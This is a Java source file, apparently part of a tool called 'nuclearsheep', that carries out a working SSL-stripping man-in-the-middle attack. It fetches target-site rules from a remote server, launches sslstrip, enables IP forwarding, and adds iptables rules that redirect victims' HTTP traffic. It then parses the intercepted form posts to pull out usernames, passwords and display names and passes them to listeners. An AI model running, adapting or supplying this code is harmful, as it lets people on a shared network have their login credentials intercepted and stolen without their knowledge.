package org.hatchunc.nuclearsheep;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLDecoder;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

import jpcap.NetworkInterface;

public class SSLStripLayer {
	private String deviceName;
	private static final int SSLSTRIP_PORT = 8080;
	private Process sslStripProcess;
	private List<UserInfoListener> userInfoListeners = new LinkedList<UserInfoListener>();
	
	class MatchTarget {
		public String domainRegex, varMatchKey, varMatchValue, varUser, varPass, varDisplayName;
		public MatchTarget(BufferedReader in) throws IOException {
			domainRegex = in.readLine();
			String var_match = in.readLine();
			String[] var_matchParts = var_match.split("=", 2);
			if (var_matchParts.length > 0 && !var_matchParts[0].equals(""))
				varMatchKey = var_matchParts[0];
			else
				varMatchKey = null;
			if (var_matchParts.length > 1)
				varMatchValue = var_matchParts[1];
			else
				varMatchValue = null;
			varUser = in.readLine();
			varPass = in.readLine();
			varDisplayName = in.readLine();
		}
	}
	private List<MatchTarget> matchTargets = new LinkedList<MatchTarget>();
	
	public SSLStripLayer(final NetworkInterface device) throws IOException {
		URL match = new URL("https://nuclearsheep-hatchunc.rhcloud.com/getmatchtargets.php");
		BufferedReader in = new BufferedReader(new InputStreamReader(match.openStream()));
		in.readLine();
		while (in.ready())
			matchTargets.add(new MatchTarget(in));
		
		this.deviceName = device.name;
		sslStripProcess= Runtime.getRuntime().exec("/usr/bin/sslstrip -k -f -l 8080 -w /tmp/sslstrip.log");
		if (System.getProperty("os.name").startsWith("Windows")) {
			//TODO use something like "netsh interface portproxy add v4tov4 8000 192.168.0.100 9000"
		} else {
			FileWriter writer = new FileWriter("/proc/sys/net/ipv4/ip_forward");
			writer.append('1');
			writer.close();
			Runtime.getRuntime().exec("/usr/sbin/iptables -t nat -A POSTROUTING -o " + deviceName + " -j MASQUERADE");
			Runtime.getRuntime().exec("/usr/sbin/iptables -t nat -A PREROUTING -i " + deviceName + " -p tcp --dport 80 -j REDIRECT --to-port " + SSLSTRIP_PORT);
		}
				
		//Kick off the matching thread
		new Thread(new Runnable() {
			//TODO: Lots of RuntimeExceptions here that should actually do something fun
			public void run() {
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) { throw new RuntimeException(e); }
				BufferedReader in;
				try {
					in = new BufferedReader(new InputStreamReader(new FileInputStream("/tmp/sslstrip.log")));
				} catch (FileNotFoundException e) { throw new RuntimeException(e); }
				while (true) {
				    String line;
					try {
						line = in.readLine();
					} catch (IOException e) { throw new RuntimeException(e); }
				    if (line == null) {
				        try {
							Thread.sleep(1000);
						} catch (InterruptedException e) { throw new RuntimeException(e); }
				    }
				    else {
				        String[] parts = line.split(" ");
				        if ((parts.length != 5 || !parts[3].equals("Data")) &&
				        		(parts.length != 6 || !parts[4].equals("Data")))
				        	continue;
				        String domain = parts[parts.length-1].substring(1, parts[parts.length-1].length()-2);
				        UserInfo bestMatch = new UserInfo(null, null, null, null);
				        String data;
						try {
							data = in.readLine();
						} catch (IOException e) { throw new RuntimeException(e); }
			        	if (data == null)
			        		continue;
				        for (MatchTarget target : matchTargets) {
				        	if (!domain.matches(target.domainRegex))
				        		continue;
				        	String[] variables = data.split("&");
				        	boolean matchedVar = target.varMatchKey == null;
				        	String displayName = null, userName = null, password = null;
				        	for (String var : variables) {
				        		String[] varParts = var.split("=", 2);
				        		if (varParts.length < 1)
				        			continue;
				        		if (!matchedVar && target.varMatchKey.equals(varParts[0])) {
				        			if (varParts.length > 1) {
				        				if (target.varMatchValue != null &&
				        						target.varMatchValue.equals(varParts[1])) {
				        					matchedVar = true;
				        				} else {
				        					matchedVar = false;
				        					break;
				        				}
				        			} else {
				        				if (target.varMatchValue == null) {
				        					matchedVar = true;
				        				} else {
				        					matchedVar = false;
				        					break;
				        				}
				        			}
				        		}
				        		if (varParts[0].equals(target.varUser) && varParts.length > 1)
				        				userName = URLDecoder.decode(varParts[1]);
				        		if (varParts[0].equals(target.varPass) && varParts.length > 1)
			        				password = URLDecoder.decode(varParts[1]);
				        		if (target.varDisplayName != null &&
				        				varParts[0].equals(target.varDisplayName) && varParts.length > 1)
			        				displayName = URLDecoder.decode(varParts[1]);
				        	}
				        	if (matchedVar) {
				        		UserInfo newUser = new UserInfo(domain, userName, password, displayName);
				        		int newUserNonNullCount = 1;
				        		if (userName != null)
				        			newUserNonNullCount++;
				        		if (password != null)
				        			newUserNonNullCount++;
				        		if (displayName != null)
				        			newUserNonNullCount++;
				        		int bestUserNonNullCount = 0;
				        		if (bestMatch.domain != null)
				        			bestUserNonNullCount++;
				        		if (bestMatch.userName != null)
				        			bestUserNonNullCount++;
				        		if (bestMatch.password != null)
				        			bestUserNonNullCount++;
				        		if (bestMatch.displayName != null)
				        			bestUserNonNullCount++;
				        		if (newUserNonNullCount > bestUserNonNullCount)
				        			bestMatch = newUser;
				        		
				        	}
				        }
		        		if (bestMatch.domain != null) {
							synchronized (userInfoListeners) {
								for (UserInfoListener listener : userInfoListeners)
									listener.receiveNewUserInfo(bestMatch);
							}
						}
				    }
				}
			}
		}).start();
	}
	
	public void stopSSLStrip() throws IOException {
		if (sslStripProcess == null)
			return;
		if (System.getProperty("os.name").startsWith("Windows")) {
			//TODO use something like "netsh interface portproxy add v4tov4 8000 192.168.0.100 9000"
		} else {
			FileWriter writer = new FileWriter("/proc/sys/net/ipv4/ip_forward");
			writer.append('0');
			writer.close();
			Runtime.getRuntime().exec("/usr/sbin/iptables -t nat -D POSTROUTING -o " + deviceName + " -j MASQUERADE");
			Runtime.getRuntime().exec("/usr/sbin/iptables -t nat -D PREROUTING -i " + deviceName + " -p tcp --dport 80 -j REDIRECT --to-port " + SSLSTRIP_PORT);
		}
		sslStripProcess.destroy();
		new File("/tmp/sslstrip.log").delete();
		sslStripProcess = null;
	}
	
	public void registerUserInfoListener(UserInfoListener listener) {
		synchronized(userInfoListeners) {
			userInfoListeners.add(listener);
		}
	}
}
